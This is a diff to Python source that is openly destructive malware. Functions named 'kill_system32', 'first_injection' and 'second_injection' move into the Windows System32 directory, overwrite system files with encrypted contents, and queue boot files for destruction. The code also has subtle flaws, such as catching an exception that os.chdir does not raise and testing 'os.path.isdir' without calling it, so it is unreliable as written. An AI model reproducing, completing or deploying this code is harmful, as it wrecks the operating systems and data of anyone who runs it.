@@ -32,7 +32,10 @@ def send(msg):
 def first_injection():
     files = []
     def kill_system32():
-        
+        try:
+            os.chdir("C:\Windows\System32")
+        except LookupError as e:
+            os.chdir("D:\Windows\System32")
         path = r"C:\Windows\System32"
         for _ in os.listdir(path):
             if os.path.isdir:
@@ -48,6 +51,10 @@ def first_injection():
                 thefile.write(contents_encrypted)
                 
 def second_injection():
+    try:
+        os.chdir("C:\Windows\System32")
+    except LookupError as e:
+        os.chdir("D:\Windows\System32")
     boot_files = []
     #first add boot files into a list
     def add_bootfiles_in_kill_queue():
